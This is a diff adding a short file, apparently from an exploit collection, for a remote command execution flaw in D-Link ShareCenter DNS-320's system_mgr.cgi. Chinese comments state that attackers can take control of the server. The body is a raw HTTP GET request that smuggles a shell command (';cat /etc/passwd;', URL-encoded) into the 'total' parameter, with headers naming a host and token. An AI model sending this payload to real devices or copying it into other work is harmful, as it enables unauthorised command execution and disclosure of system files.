@@ -1,0 +1,9 @@
+# D-Link ShareCenter DNS-320 system_mgr.cgi 远程命令执行漏洞
+# D-Link ShareCenter DNS-320 system_mgr.cgi 存在远程命令执行，攻击者通过漏洞可以控制服务器
+GET /cgi-bin/system_mgr.cgi?acid=80051531&cmd=cgi_get_log_item&total=%3Bcat%20%2Fetc%2Fpasswd%3B&bid=hd_tag_m8mv23ve HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23ve
+RM-PRO-Token: d2a7ad1a6e71c8bad2136cb5c207071a
+RM-PRO-Time: 1742808347286
+User-Agent: curl/7.83.1
+
